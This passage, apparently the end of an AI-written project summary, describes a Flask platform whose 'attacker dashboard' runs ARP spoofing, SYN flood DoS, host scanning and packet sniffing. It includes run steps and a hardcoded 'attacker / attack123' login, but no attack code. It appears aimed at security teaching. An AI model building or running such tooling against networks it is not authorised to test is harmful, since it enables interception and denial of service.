| Traffic Sniffer | Packet capture & analysis | ✅ Fixed (returns packets) |
| Stop Controls | Cancel scans/sniffs | ✅ Implemented |
| Real-Time UI | Live updates | ✅ Polling system |

### Key Technologies:

- **Flask** - Web framework
- **Scapy** - Raw packet manipulation
- **Threading** - Background operations
- **JSON** - User storage & API responses
- **JavaScript** - Frontend interactivity
- **HTML/CSS** - User interface

### How to Use:

1. **Windows:** `python app.py`
2. **Linux/Kali:** `sudo python app.py`
3. Go to `http://localhost:5000`
4. Login: attacker / attack123
5. Choose attack, enter parameters, click Start
6. Watch live results
7. Click Stop when done

---

## What Each File Does

| File | Lines | Purpose |
|------|-------|---------|
| app.py | 195 | Main Flask app, routes, login |
| models.py | 128 | User authentication, JSON storage |
| routes/attacks.py | 280 | ARP/SYN attack endpoints |
| routes/api.py | 240 | Scanner/Sniffer/Info endpoints |
| modules/arp_spoof.py | 150 | ARP spoofing implementation |
| modules/syn_flood.py | 120 | SYN flood DoS implementation |
| modules/network_scanner.py | 365 | Host & port scanning |
| modules/traffic_sniffer.py | 395 | Packet sniffing & analysis |
| templates/login.html | 200 | Login page |
| templates/attacker.html | 620 | Attacker dashboard (attacks, scanner, sniffer) |
| templates/defender.html | 150 | Defender dashboard (placeholder) |
| templates/base.html | 95 | HTML base template (header/footer) |

**Total: ~2,500 lines of code**

---

This is your complete cybersecurity platform! 🎓
